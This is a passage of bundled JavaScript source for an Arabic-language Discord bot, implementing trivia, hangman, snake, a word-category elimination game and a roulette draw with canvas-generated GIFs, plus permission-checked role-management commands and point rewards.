          const filter = (m) => m.content.toLowerCase().trim() === question.a.toLowerCase().trim();
          const collector = message.channel.createMessageCollector({ filter, time: 15e3, max: 1 });
          collector.on("collect", (m) => {
            const winEmbed = new EmbedBuilder().setTitle("\u2705 \u0625\u062C\u0627\u0628\u0629 \u0635\u062D\u064A\u062D\u0629!").setDescription(`\u0645\u0628\u0631\u0648\u0643 \u064A\u0627 ${m.author}! \u0627\u0644\u0625\u062C\u0627\u0628\u0629 \u0647\u064A: **${question.a}**`).setColor(65280).setTimestamp();
            message.channel.send({ embeds: [winEmbed] });
          });
          collector.on("end", (collected) => {
            if (collected.size === 0) {
              const loseEmbed = new EmbedBuilder().setTitle("\u23F0 \u0627\u0646\u062A\u0647\u0649 \u0627\u0644\u0648\u0642\u062A!").setDescription(`\u0627\u0644\u0625\u062C\u0627\u0628\u0629 \u0627\u0644\u0635\u062D\u064A\u062D\u0629 \u0643\u0627\u0646\u062A: **${question.a}**`).setColor(16711680).setTimestamp();
              message.channel.send({ embeds: [loseEmbed] });
            }
          });
          return;
        }
        if (commandName === "hangman") {
          const loadingMsg = await message.reply("\u23F3 \u062C\u0627\u0631\u064A \u062A\u0648\u0644\u064A\u062F \u0643\u0644\u0645\u0629 \u0630\u0643\u0627\u0621 \u0627\u0635\u0637\u0646\u0627\u0639\u064A...");
          const aiData = await getAIHangmanWord();
          const word = aiData.word;
          const hint = aiData.hint;
          let guessedLetters = [];
          let mistakes = 0;
          const maxMistakes = 6;
          const getDisplayWord = () => {
            return word.split("").map((char) => guessedLetters.includes(char) ? char : " _ ").join("");
          };
          const embed = new EmbedBuilder().setTitle("\u{1F635} \u0644\u0639\u0628\u0629 \u0627\u0644\u0645\u0634\u0646\u0642\u0629 (\u0645\u062F\u0639\u0648\u0645\u0629 \u0628\u0627\u0644\u0630\u0643\u0627\u0621 \u0627\u0644\u0627\u0635\u0637\u0646\u0627\u0639\u064A)").setDescription(`**\u0627\u0644\u062A\u0644\u0645\u064A\u062D:** ${hint}

\u0627\u0644\u0643\u0644\u0645\u0629: \`${getDisplayWord()}\`
\u0627\u0644\u0623\u062E\u0637\u0627\u0621: ${mistakes}/${maxMistakes}`).setColor(5793266).setTimestamp();
          await loadingMsg.edit({ content: null, embeds: [embed] });
          const filter = (m) => m.author.id === message.author.id && m.content.length === 1;
          const collector = message.channel.createMessageCollector({ filter, time: 6e4 });
          collector.on("collect", async (m) => {
            const char = m.content.toLowerCase();
            if (guessedLetters.includes(char)) {
              return m.reply("\u0644\u0642\u062F \u0627\u062E\u062A\u0631\u062A \u0647\u0630\u0627 \u0627\u0644\u062D\u0631\u0641 \u0645\u0646 \u0642\u0628\u0644!");
            }
            guessedLetters.push(char);
            if (word.toLowerCase().includes(char)) {
              if (!getDisplayWord().includes("_")) {
                const winEmbed = new EmbedBuilder().setTitle("\u{1F389} \u0645\u0628\u0631\u0648\u0643!").setDescription(`\u0644\u0642\u062F \u0641\u0632\u062A \u064A\u0627 <@${message.author.id}>! \u0627\u0644\u0643\u0644\u0645\u0629 \u0643\u0627\u0646\u062A: **${word}**`).setColor(65280).setTimestamp();
                await message.channel.send({ content: `\u0645\u0628\u0631\u0648\u0643 \u0644\u0644\u0641\u0627\u0626\u0632! <@${message.author.id}>`, embeds: [winEmbed] });
                collector.stop();
              } else {
                const updateEmbed = new EmbedBuilder().setTitle("\u{1F635} \u0644\u0639\u0628\u0629 \u0627\u0644\u0645\u0634\u0646\u0642\u0629").setDescription(`**\u0627\u0644\u062A\u0644\u0645\u064A\u062D:** ${hint}

\u0627\u0644\u0643\u0644\u0645\u0629: \`${getDisplayWord()}\`
\u0627\u0644\u0623\u062E\u0637\u0627\u0621: ${mistakes}/${maxMistakes}`).setColor(5793266).setTimestamp();
                await message.channel.send({ embeds: [updateEmbed] });
              }
            } else {
              mistakes++;
              if (mistakes >= maxMistakes) {
                const loseEmbed = new EmbedBuilder().setTitle("\u{1F480} \u062E\u0633\u0631\u062A!").setDescription(`\u0644\u0642\u062F \u062A\u0645 \u0634\u0646\u0642\u0643! \u0627\u0644\u0643\u0644\u0645\u0629 \u0643\u0627\u0646\u062A: **${word}**`).setColor(16711680).setTimestamp();
                await message.channel.send({ embeds: [loseEmbed] });
                collector.stop();
              } else {
                const updateEmbed = new EmbedBuilder().setTitle("\u{1F635} \u0644\u0639\u0628\u0629 \u0627\u0644\u0645\u0634\u0646\u0642\u0629").setDescription(`**\u0627\u0644\u062A\u0644\u0645\u064A\u062D:** ${hint}

\u0627\u0644\u0643\u0644\u0645\u0629: \`${getDisplayWord()}\`
\u0627\u0644\u0623\u062E\u0637\u0627\u0621: ${mistakes}/${maxMistakes}`).setColor(5793266).setTimestamp();
                await message.channel.send({ embeds: [updateEmbed] });
              }
            }
          });
          return;
        }
        if (commandName === "fastclick") {
          return message.reply("FastClick game is best played via slash commands. Use `/fastclick` instead.");
        }
        if (commandName === "snake") {
          return message.reply("Snake game is best played via slash commands. Use `/snake` instead.");
        }
        if (commandName === "copy-server") {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          return message.reply("Copy Server is a complex operation. Please use the slash command `/copy-server` to initiate it safely.");
        }
        if (commandName === "botinfo") {
          const embed = new EmbedBuilder().setTitle("Bot Information").addFields(
            { name: "Servers", value: `${client.guilds.cache.size}`, inline: true },
            { name: "Users", value: `${client.users.cache.size}`, inline: true },
            { name: "Uptime", value: `${Math.floor(client.uptime / 1e3 / 60)} minutes`, inline: true }
          ).setColor(44678);
          return message.reply({ embeds: [embed] });
        }
        if (commandName === "add-role") {
          if (!message.member?.permissions.has(PermissionFlagsBits.ManageRoles)) {
            return message.reply("You need 'Manage Roles' permission.");
          }
          const target = message.mentions.members.first();
          const role = message.mentions.roles.first();
          if (!target || !role) return message.reply("Usage: add-role <@user> <@role>");
          try {
            await target.roles.add(role);
            return message.reply(`\u2705 Added role <@&${role.id}> to ${target}.`);
          } catch (err) {
            return message.reply("\u274C Failed to add role. Check my permissions and role hierarchy.");
          }
        }
        if (commandName === "remove-role") {
          if (!message.member?.permissions.has(PermissionFlagsBits.ManageRoles)) {
            return message.reply("You need 'Manage Roles' permission.");
          }
          const target = message.mentions.members.first();
          const role = message.mentions.roles.first();
          if (!target || !role) return message.reply("Usage: remove-role <@user> <@role>");
          try {
            await target.roles.remove(role);
            return message.reply(`\u2705 Removed role <@&${role.id}> from ${target}.`);
          } catch (err) {
            return message.reply("\u274C Failed to remove role. Check my permissions and role hierarchy.");
          }
        }
        if (commandName === "list-roles") {
          const roles = message.guild?.roles.cache.filter((r) => r.name !== "@everyone").map((r) => `<@&${r.id}>`).join(", ");
          return message.reply(`**Roles in this server:**
${roles || "None"}`);
        }
      }
    }
  } catch (err) {
    console.error("Critical error in messageCreate event:", err);
  }
});
async function generateReplicaImage(category, letter) {
  const width = 400;
  const height = 400;
  const canvas = createCanvas(width, height);
  const ctx = canvas.getContext("2d");
  const encoder = new GIFEncoder(width, height);
  encoder.start();
  encoder.setRepeat(-1);
  encoder.setDelay(500);
  encoder.setQuality(10);
  ctx.fillStyle = "#2C2F33";
  ctx.fillRect(0, 0, width, height);
  ctx.fillStyle = "#FFFFFF";
  ctx.font = "bold 40px Arial";
  ctx.fillText(category, 50, 200);
  ctx.fillText(letter, 300, 200);
  encoder.addFrame(ctx);
  encoder.finish();
  return encoder.out.getData();
}
async function verifyReplicaAnswer(word, category, letter) {
  const dictionary = {
    "\u062D\u064A\u0648\u0627\u0646": ["\u0623\u0633\u062F", "\u0646\u0645\u0631", "\u0641\u064A\u0644", "\u0632\u0631\u0627\u0641\u0629", "\u0642\u0637\u0629", "\u0643\u0644\u0628"],
    "\u062C\u0645\u0627\u062F": ["\u0637\u0627\u0648\u0644\u0629", "\u0643\u0631\u0633\u064A", "\u0642\u0644\u0645", "\u0643\u062A\u0627\u0628", "\u0647\u0627\u062A\u0641"],
    "\u0625\u0646\u0633\u0627\u0646": ["\u0623\u062D\u0645\u062F", "\u0645\u062D\u0645\u062F", "\u0633\u0627\u0631\u0629", "\u0639\u0644\u064A", "\u0641\u0627\u0637\u0645\u0629"],
    "\u0646\u0628\u0627\u062A": ["\u062A\u0641\u0627\u062D", "\u0645\u0648\u0632", "\u0648\u0631\u062F", "\u0634\u062C\u0631", "\u0646\u062E\u0644"],
    "\u0628\u0644\u0627\u062F": ["\u0645\u0635\u0631", "\u0627\u0644\u0633\u0639\u0648\u062F\u064A\u0629", "\u0633\u0648\u0631\u064A\u0627", "\u0627\u0644\u0639\u0631\u0627\u0642", "\u0644\u0628\u0646\u0627\u0646"]
  };
  const validWords = dictionary[category] || [];
  return validWords.includes(word) && word.startsWith(letter);
}
async function handleReplicaCommand(interaction) {
  const lobbyEmbed = new EmbedBuilder().setTitle("\u{1F3AE} \u0644\u0639\u0628\u0629 \u0631\u064A\u0628\u064A\u0643\u0627 (\u0625\u0646\u0633\u0627\u0646\u060C \u062D\u064A\u0648\u0627\u0646\u060C ...)").setDescription("\u0627\u0636\u063A\u0637 \u0639\u0644\u0649 \u0627\u0644\u0632\u0631 \u0644\u0644\u0627\u0646\u0636\u0645\u0627\u0645 \u0625\u0644\u0649 \u0627\u0644\u0644\u0639\u0628\u0629!\n\n**\u0642\u0648\u0627\u0646\u064A\u0646 \u0627\u0644\u0644\u0639\u0628\u0629:**\n\u2022 \u0633\u064A\u062A\u0645 \u0627\u062E\u062A\u064A\u0627\u0631 \u0644\u0627\u0639\u0628 \u0639\u0634\u0648\u0627\u0626\u064A \u0641\u064A \u0643\u0644 \u062F\u0648\u0631.\n\u2022 \u064A\u062C\u0628 \u0639\u0644\u064A\u0643 \u0643\u062A\u0627\u0628\u0629 \u0643\u0644\u0645\u0629 \u062A\u0628\u062F\u0623 \u0628\u0627\u0644\u062D\u0631\u0641 \u0627\u0644\u0645\u0637\u0644\u0648\u0628.\n\u2022 \u0627\u0644\u0641\u0626\u0627\u062A \u062A\u062A\u063A\u064A\u0631 \u0641\u064A \u0643\u0644 \u062F\u0648\u0631 (\u0625\u0646\u0633\u0627\u0646 -> \u062D\u064A\u0648\u0627\u0646 -> \u062C\u0645\u0627\u062F -> \u0646\u0628\u0627\u062A -> \u0628\u0644\u0627\u062F).\n\u2022 \u0625\u0630\u0627 \u0623\u062E\u0637\u0623\u062A \u0623\u0648 \u062A\u0623\u062E\u0631\u062A \u0633\u064A\u062A\u0645 \u0625\u0642\u0635\u0627\u0624\u0643!").setColor(44678).addFields({ name: "\u0627\u0644\u0648\u0642\u062A \u0627\u0644\u0645\u062A\u0628\u0642\u064A", value: "60 \u062B\u0627\u0646\u064A\u0629" }).setFooter({ text: "\u064A\u062C\u0628 \u0627\u0646\u0636\u0645\u0627\u0645 3 \u0644\u0627\u0639\u0628\u064A\u0646 \u0639\u0644\u0649 \u0627\u0644\u0623\u0642\u0644 \u0644\u0644\u0628\u062F\u0621" });
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId("replica_join").setLabel("\u0627\u0646\u0636\u0645\u0627\u0645").setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId("replica_start").setLabel("\u0628\u062F\u0621 \u0627\u0644\u0644\u0639\u0628\u0629").setStyle(ButtonStyle.Success)
  );
  const msg = await interaction.reply({ embeds: [lobbyEmbed], components: [row], fetchReply: true });
  const players = [];
  let timeLeft = 60;
  activeGames.set(msg.id, { guildId: interaction.guildId, channelId: interaction.channelId, type: "Replica" });
  const timer = setInterval(async () => {
    timeLeft -= 5;
    if (timeLeft <= 0) {
      clearInterval(timer);
      if (players.length >= 3) {
        lobbyCollector.stop("started");
      } else {
        lobbyCollector.stop("not_enough_players");
      }
      return;
    }
    const updatedEmbed = EmbedBuilder.from(lobbyEmbed).setDescription(`\u0627\u0644\u0644\u0627\u0639\u0628\u064A\u0646 \u0627\u0644\u0645\u0646\u0636\u0645\u064A\u0646 (${players.length}):
${players.map((p) => `\u2022 ${p.name}`).join("\n") || "\u0644\u0627 \u064A\u0648\u062C\u062F \u0644\u0627\u0639\u0628\u064A\u0646 \u0628\u0639\u062F"}`).setFields({ name: "\u0627\u0644\u0648\u0642\u062A \u0627\u0644\u0645\u062A\u0628\u0642\u064A", value: `${timeLeft} \u062B\u0627\u0646\u064A\u0629` });
    await interaction.editReply({ embeds: [updatedEmbed] }).catch(() => clearInterval(timer));
  }, 5e3);
  const lobbyCollector = msg.createMessageComponentCollector({ time: 6e4 });
  lobbyCollector.on("collect", async (i) => {
    if (i.customId === "replica_join") {
      if (players.some((p) => p.id === i.user.id)) return i.reply({ content: "\u0623\u0646\u062A \u0645\u0646\u0636\u0645 \u0628\u0627\u0644\u0641\u0639\u0644!", ephemeral: true });
      players.push({ id: i.user.id, name: i.user.username });
      const updatedEmbed = EmbedBuilder.from(lobbyEmbed).setDescription(`\u0627\u0644\u0644\u0627\u0639\u0628\u064A\u0646 \u0627\u0644\u0645\u0646\u0636\u0645\u064A\u0646 (${players.length}):
${players.map((p) => `\u2022 ${p.name}`).join("\n")}`).setFields({ name: "\u0627\u0644\u0648\u0642\u062A \u0627\u0644\u0645\u062A\u0628\u0642\u064A", value: `${timeLeft} \u062B\u0627\u0646\u064A\u0629` });
      await i.update({ embeds: [updatedEmbed] });
    }
    if (i.customId === "replica_start") {
      if (i.user.id !== interaction.user.id) return i.reply({ content: "\u0635\u0627\u062D\u0628 \u0627\u0644\u0623\u0645\u0631 \u0641\u0642\u0637 \u064A\u0645\u0643\u0646\u0647 \u0627\u0644\u0628\u062F\u0621!", ephemeral: true });
      if (players.length < 3) return i.reply({ content: "\u064A\u062C\u0628 \u0627\u0646\u0636\u0645\u0627\u0645 3 \u0644\u0627\u0639\u0628\u064A\u0646 \u0639\u0644\u0649 \u0627\u0644\u0623\u0642\u0644!", ephemeral: true });
      clearInterval(timer);
      lobbyCollector.stop("started");
    }
  });
  lobbyCollector.on("end", async (_, reason) => {
    clearInterval(timer);
    activeGames.delete(msg.id);
    if (reason !== "started") {
      if (reason === "not_enough_players" || reason === "time" && players.length < 3) {
        return interaction.editReply({ content: "\u274C \u062A\u0645 \u0625\u0644\u063A\u0627\u0621 \u0627\u0644\u0644\u0639\u0628\u0629 \u0644\u0639\u062F\u0645 \u0627\u0643\u062A\u0645\u0627\u0644 \u0627\u0644\u0639\u062F\u062F.", embeds: [], components: [] });
      }
      if (reason === "time" && players.length >= 3) {
      } else if (reason !== "started") {
        return;
      }
    }
    let currentPlayers = [...players];
    const categories = ["\u0625\u0646\u0633\u0627\u0646", "\u062D\u064A\u0648\u0627\u0646", "\u062C\u0645\u0627\u062F", "\u0646\u0628\u0627\u062A", "\u0628\u0644\u0627\u062F"];
    const alphabet = "\u0623\u0628\u062A\u062B\u062C\u062D\u062E\u062F\u0630\u0631\u0632\u0633\u0634\u0635\u0636\u0637\u0638\u0639\u063A\u0641\u0642\u0643\u0644\u0645\u0646\u0647\u0648\u064A";
    const history = [];
    while (currentPlayers.length > 1) {
      const currentPlayer = currentPlayers[Math.floor(Math.random() * currentPlayers.length)];
      const currentLetter = alphabet[Math.floor(Math.random() * alphabet.length)];
      await interaction.channel.send({ content: `\u{1F514} \u062F\u0648\u0631 \u0627\u0644\u0644\u0627\u0639\u0628: <@${currentPlayer.id}>
\u0627\u0644\u062D\u0631\u0641 \u0627\u0644\u0645\u062E\u062A\u0627\u0631: **${currentLetter}**
\u0633\u0623\u0637\u0644\u0628 \u0645\u0646\u0643 \u0627\u0644\u0622\u0646 5 \u0623\u0634\u064A\u0627\u0621 \u062A\u0628\u062F\u0623 \u0628\u0647\u0630\u0627 \u0627\u0644\u062D\u0631\u0641!` });
      let failed = false;
      for (const category of categories) {
        const buffer2 = await generateReplicaImage(category, currentLetter);
        const attachment2 = new AttachmentBuilder(buffer2, { name: "replica.gif" });
        const roundEmbed = new EmbedBuilder().setTitle(`\u{1F3AE} \u0631\u064A\u0628\u064A\u0643\u0627 - ${category}`).setDescription(`\u0623\u0639\u0637\u0646\u064A \u0627\u0633\u0645 **${category}** \u064A\u0628\u062F\u0623 \u0628\u062D\u0631\u0641 **${currentLetter}**
\u0644\u062F\u064A\u0643 **15 \u062B\u0627\u0646\u064A\u0629**!`).setColor(5793266).setImage("attachment://replica.gif");
        await interaction.channel.send({ content: `<@${currentPlayer.id}>`, embeds: [roundEmbed], files: [attachment2] });
        const filter = (m) => m.author.id === currentPlayer.id;
        try {
          const collected = await interaction.channel.awaitMessages({ filter, max: 1, time: 15e3, errors: ["time"] });
          const word = collected.first().content.trim();
          const isCorrect = await verifyReplicaAnswer(word, category, currentLetter);
          if (isCorrect) {
            await collected.first().react("\u2705");
            history.push({ player: currentPlayer.name, category, letter: currentLetter, word, status: "correct" });
          } else {
            await collected.first().react("\u274C");
            failed = true;
            history.push({ player: currentPlayer.name, category, letter: currentLetter, word, status: "wrong" });
            await interaction.channel.send({ content: `\u274C \u062E\u0637\u0623! \u0627\u0644\u0643\u0644\u0645\u0629 \u063A\u064A\u0631 \u0635\u062D\u064A\u062D\u0629 \u0623\u0648 \u0644\u0627 \u062A\u0628\u062F\u0623 \u0628\u062D\u0631\u0641 **${currentLetter}**. \u062A\u0645 \u0625\u0642\u0635\u0627\u0621 **${currentPlayer.name}**!` });
            break;
          }
        } catch (e) {
          failed = true;
          history.push({ player: currentPlayer.name, category, letter: currentLetter, word: "---", status: "wrong" });
          await interaction.channel.send({ content: `\u23F0 \u0627\u0646\u062A\u0647\u0649 \u0627\u0644\u0648\u0642\u062A! \u062A\u0645 \u0625\u0642\u0635\u0627\u0621 **${currentPlayer.name}** \u0644\u062A\u0623\u062E\u0631\u0647 \u0641\u064A \u0627\u0644\u0631\u062F.` });
          break;
        }
      }
      if (failed) {
        currentPlayers = currentPlayers.filter((p) => p.id !== currentPlayer.id);
      } else {
        await interaction.channel.send({ content: `\u2705 \u0643\u0641\u0648! <@${currentPlayer.id}> \u0623\u0643\u0645\u0644 \u062C\u0645\u064A\u0639 \u0627\u0644\u0641\u0626\u0627\u062A \u0628\u0646\u062C\u0627\u062D!` });
      }
      const encoder = new GIFEncoder(600, 400);
      encoder.start();
      encoder.setRepeat(-1);
      encoder.setDelay(500);
      encoder.setQuality(10);
      const canvas = createCanvas(600, 400);
      const ctx = canvas.getContext("2d");
      ctx.fillStyle = "#2C2F33";
      ctx.fillRect(0, 0, 600, 400);
      ctx.fillStyle = "#FFFFFF";
      ctx.font = "bold 24px Arial";
      ctx.fillText("\u0633\u062C\u0644 \u0627\u0644\u062C\u0648\u0644\u0627\u062A", 230, 40);
      const rowHeight = 30;
      const startY = 80;
      ctx.font = "18px Arial";
      ctx.fillText("\u0627\u0644\u0644\u0627\u0639\u0628", 500, startY);
      ctx.fillText("\u0627\u0644\u0641\u0626\u0629", 400, startY);
      ctx.fillText("\u0627\u0644\u062D\u0631\u0641", 300, startY);
      ctx.fillText("\u0627\u0644\u0643\u0644\u0645\u0629", 200, startY);
      ctx.fillText("\u0627\u0644\u062D\u0627\u0644\u0629", 50, startY);
      ctx.strokeStyle = "#FFFFFF";
      ctx.beginPath();
      ctx.moveTo(50, startY + 10);
      ctx.lineTo(550, startY + 10);
      ctx.stroke();
      const displayHistory = history.slice(-8);
      displayHistory.forEach((h, idx) => {
        const y = startY + 40 + idx * rowHeight;
        ctx.font = "16px Arial";
        ctx.fillStyle = h.status === "correct" ? "#00FF00" : "#FF0000";
        ctx.fillText(h.player.substring(0, 10), 500, y);
        ctx.fillText(h.category, 400, y);
        ctx.fillText(h.letter, 300, y);
        ctx.fillText(h.word.substring(0, 10), 200, y);
        ctx.fillText(h.status === "correct" ? "\u0635\u062D" : "\u062E\u0637\u0623", 50, y);
      });
      encoder.addFrame(ctx);
      encoder.finish();
      const buffer = encoder.out.getData();
      const attachment = new AttachmentBuilder(buffer, { name: "history.gif" });
      await interaction.channel.send({
        content: `\u{1F4CA} \u0645\u0644\u062E\u0635 \u0627\u0644\u062C\u0648\u0644\u0629 \u0627\u0644\u062D\u0627\u0644\u064A\u0629 \u0648\u0627\u0644\u0644\u0627\u0639\u0628\u064A\u0646 \u0627\u0644\u0645\u062A\u0628\u0642\u064A\u0646: **${currentPlayers.length}**`,
        files: [attachment]
      });
      await new Promise((r) => setTimeout(r, 3e3));
    }
    const winner = currentPlayers[0];
    const xbReward = 50;
    await awardXB(interaction.guildId, winner.id, xbReward, "Riddle win");
    const winEmbed = new EmbedBuilder().setTitle("\u{1F3C6} \u0628\u0637\u0644 \u0631\u064A\u0628\u064A\u0643\u0627!").setDescription(`\u0643\u0641\u0648\u0648\u0648 \u064A\u0627 <@${winner.id}>! \u0644\u0642\u062F \u0641\u0632\u062A \u0641\u064A \u0627\u0644\u0644\u0639\u0628\u0629 \u0648\u062A\u063A\u0644\u0628\u062A \u0639\u0644\u0649 \u0627\u0644\u062C\u0645\u064A\u0639!

\u{1F4B0} \u0644\u0642\u062F \u062D\u0635\u0644\u062A \u0639\u0644\u0649 **${xbReward}** XB!`).setColor(65280).setTimestamp();
    await interaction.followUp({ content: `\u0645\u0628\u0631\u0648\u0643 \u0644\u0644\u0641\u0627\u0626\u0632! <@${winner.id}>`, embeds: [winEmbed] });
  });
}
async function handleSnakeCommand(interaction) {
  const width = 10;
  const height = 10;
  let snake = [{ x: 5, y: 5 }];
  let food = { x: Math.floor(Math.random() * width), y: Math.floor(Math.random() * height) };
  let direction = { x: 0, y: -1 };
  let score = 0;
  const drawBoard = () => {
    let board = "";
    for (let y = 0; y < height; y++) {
      for (let x = 0; x < width; x++) {
        if (snake.some((s) => s.x === x && s.y === y)) {
          board += "\u{1F7E9}";
        } else if (food.x === x && food.y === y) {
          board += "\u{1F34E}";
        } else {
          board += "\u2B1B";
        }
      }
      board += "\n";
    }
    return board;
  };
  const embed = new EmbedBuilder().setTitle("\u{1F40D} \u0644\u0639\u0628\u0629 \u0627\u0644\u062B\u0639\u0628\u0627\u0646").setDescription(drawBoard()).setFooter({ text: `\u0627\u0644\u0633\u0643\u0648\u0631: ${score}` }).setColor(65280).setTimestamp();
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId("snake_up").setEmoji("\u2B06\uFE0F").setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId("snake_down").setEmoji("\u2B07\uFE0F").setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId("snake_left").setEmoji("\u2B05\uFE0F").setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId("snake_right").setEmoji("\u27A1\uFE0F").setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId("snake_stop").setLabel("\u0625\u064A\u0642\u0627\u0641").setStyle(ButtonStyle.Danger)
  );
  const msg = await interaction.reply({ embeds: [embed], components: [row], fetchReply: true });
  const collector = msg.createMessageComponentCollector({ time: 6e4 });
  collector.on("collect", async (i) => {
    if (i.user.id !== interaction.user.id) return i.reply({ content: "\u0647\u0630\u0647 \u0644\u064A\u0633\u062A \u0644\u0639\u0628\u062A\u0643!", ephemeral: true });
    if (i.customId === "snake_stop") {
      collector.stop();
      return i.update({ content: "\u062A\u0645 \u0625\u064A\u0642\u0627\u0641 \u0627\u0644\u0644\u0639\u0628\u0629.", components: [] });
    }
    if (i.customId === "snake_up") direction = { x: 0, y: -1 };
    if (i.customId === "snake_down") direction = { x: 0, y: 1 };
    if (i.customId === "snake_left") direction = { x: -1, y: 0 };
    if (i.customId === "snake_right") direction = { x: 1, y: 0 };
    const newHead = { x: snake[0].x + direction.x, y: snake[0].y + direction.y };
    if (newHead.x < 0 || newHead.x >= width || newHead.y < 0 || newHead.y >= height || snake.some((s) => s.x === newHead.x && s.y === newHead.y)) {
      collector.stop();
      const xbReward = score * 2;
      await awardXB(interaction.guildId, interaction.user.id, xbReward, "Snake win");
      const loseEmbed = new EmbedBuilder().setTitle("\u{1F480} \u062C\u064A\u0645 \u0623\u0648\u0641\u0631!").setDescription(`<@${interaction.user.id}> \u0644\u0642\u062F \u062E\u0633\u0631\u062A! \u0627\u0644\u0633\u0643\u0648\u0631 \u0627\u0644\u0646\u0647\u0627\u0626\u064A: **${score}**

\u{1F4B0} \u0644\u0642\u062F \u062D\u0635\u0644\u062A \u0639\u0644\u0649 **${xbReward}** XB!`).setColor(16711680).setTimestamp();
      return i.update({ embeds: [loseEmbed], components: [] });
    }
    snake.unshift(newHead);
    if (newHead.x === food.x && newHead.y === food.y) {
      score++;
      food = { x: Math.floor(Math.random() * width), y: Math.floor(Math.random() * height) };
    } else {
      snake.pop();
    }
    const updateEmbed = new EmbedBuilder().setTitle("\u{1F40D} \u0644\u0639\u0628\u0629 \u0627\u0644\u062B\u0639\u0628\u0627\u0646").setDescription(drawBoard()).setFooter({ text: `\u0627\u0644\u0633\u0643\u0648\u0631: ${score}` }).setColor(65280).setTimestamp();
    await i.update({ embeds: [updateEmbed] });
  });
}
async function generateRouletteImage(currentOptions, winnerIdx) {
  const width = 400;
  const height = 400;
  const canvas = createCanvas(width, height);
  const ctx = canvas.getContext("2d");
  const encoder = new GIFEncoder(width, height);
  encoder.start();
  encoder.setRepeat(-1);
  encoder.setDelay(500);
  encoder.setQuality(10);
  const colors = ["#FF5733", "#33FF57", "#3357FF", "#F333FF", "#FF33A1", "#33FFF3", "#F3FF33", "#8D33FF"];
  const sliceAngle = Math.PI * 2 / currentOptions.length;
  const finalRotation = -(winnerIdx * sliceAngle + sliceAngle / 2);
  ctx.clearRect(0, 0, width, height);
  ctx.fillStyle = "#2C2F33";
  ctx.fillRect(0, 0, width, height);
  for (let j = 0; j < currentOptions.length; j++) {
    const startAngle = j * sliceAngle + finalRotation;
    const endAngle = (j + 1) * sliceAngle + finalRotation;
    ctx.beginPath();
    ctx.moveTo(200, 200);
    ctx.arc(200, 200, 150, startAngle, endAngle);
    ctx.fillStyle = colors[j % colors.length];
    ctx.fill();
    ctx.strokeStyle = "#FFFFFF";
    ctx.lineWidth = 2;
    ctx.stroke();
    ctx.save();
    ctx.translate(200, 200);
    ctx.rotate(startAngle + sliceAngle / 2);
    ctx.textAlign = "right";
    ctx.fillStyle = "#FFFFFF";
    ctx.font = "bold 14px Arial";
    const text = currentOptions[j].length > 10 ? currentOptions[j].substring(0, 8) + ".." : currentOptions[j];
    ctx.fillText(text, 140, 5);
    ctx.restore();
  }
  ctx.beginPath();
  ctx.moveTo(360, 200);
  ctx.lineTo(380, 190);
  ctx.lineTo(380, 210);
  ctx.closePath();
  ctx.fillStyle = "#FFFFFF";
  ctx.fill();
  encoder.addFrame(ctx);
  encoder.finish();
  return encoder.out.getData();
}
async function handleRouletteCommand(interaction) {
  const optionsStr = interaction.options.getString("options");
  let options = [];
  if (optionsStr) {
    options = optionsStr.split(",").map((o) => o.trim()).filter((o) => o.length > 0);
    if (options.length < 2) {
      return interaction.reply({ content: "\u274C \u064A\u0631\u062C\u0649 \u0625\u062F\u062E\u0627\u0644 \u062E\u064A\u0627\u0631\u064A\u0646 \u0639\u0644\u0649 \u0627\u0644\u0623\u0642\u0644 \u0645\u0641\u0635\u0648\u0644\u064A\u0646 \u0628\u0641\u0627\u0635\u0644\u0629.", ephemeral: true });
    }
  }
  if (options.length > 0) {
    await interaction.deferReply();
    const winnerIdx = Math.floor(Math.random() * options.length);
    const buffer = await generateRouletteImage(options, winnerIdx);
    const attachment = new AttachmentBuilder(buffer, { name: "roulette.gif" });
    const winnerText = options[winnerIdx];
    const embed = new EmbedBuilder().setTitle("\u{1F3B0} \u0646\u062A\u064A\u062C\u0629 \u0627\u0644\u0633\u062D\u0628 \u0631\u0648\u0644\u064A\u062A").setDescription(`\u0627\u0644\u0641\u0627\u0626\u0632 \u0647\u0648: **${winnerText}**`).setColor(16766720).setImage("attachment://roulette.gif").setTimestamp();
    return interaction.editReply({ content: `\u0645\u0628\u0631\u0648\u0643 \u0644\u0644\u0641\u0627\u0626\u0632! ${winnerText}`, embeds: [embed], files: [attachment] });
  }
  const lobbyEmbed = new EmbedBuilder().setTitle("\u{1F3B0} \u0631\u0648\u0644\u064A\u062A \u0627\u0644\u0625\u0642\u0635\u0627\u0621 \u0627\u0644\u062A\u0641\u0627\u0639\u0644\u064A").setDescription("\u0627\u0636\u063A\u0637 \u0639\u0644\u0649 \u0627\u0644\u0632\u0631 \u0644\u0644\u0627\u0646\u0636\u0645\u0627\u0645 \u0625\u0644\u0649 \u0627\u0644\u0644\u0639\u0628\u0629!").setColor(5793266).addFields({ name: "\u0627\u0644\u0648\u0642\u062A \u0627\u0644\u0645\u062A\u0628\u0642\u064A", value: "60 \u062B\u0627\u0646\u064A\u0629" }).setFooter({ text: "\u064A\u062C\u0628 \u0627\u0646\u0636\u0645\u0627\u0645 3 \u0644\u0627\u0639\u0628\u064A\u0646 \u0639\u0644\u0649 \u0627\u0644\u0623\u0642\u0644 \u0644\u0644\u0628\u062F\u0621" });
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId("roulette_join").setLabel("\u0627\u0646\u0636\u0645\u0627\u0645").setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId("roulette_start").setLabel("\u0628\u062F\u0621 \u0627\u0644\u0644\u0639\u0628\u0629").setStyle(ButtonStyle.Success)
  );
  const msg = await interaction.reply({ embeds: [lobbyEmbed], components: [row], fetchReply: true });
  const players = [];
  let timeLeft = 60;
  activeGames.set(msg.id, { guildId: interaction.guildId, channelId: interaction.channelId, type: "Roulette" });
  const timer = setInterval(async () => {
    timeLeft -= 5;
    if (timeLeft <= 0) {
      clearInterval(timer);
      if (players.length >= 3) {
        lobbyCollector.stop("started");
      } else {
        lobbyCollector.stop("not_enough_players");
      }
      return;
    }
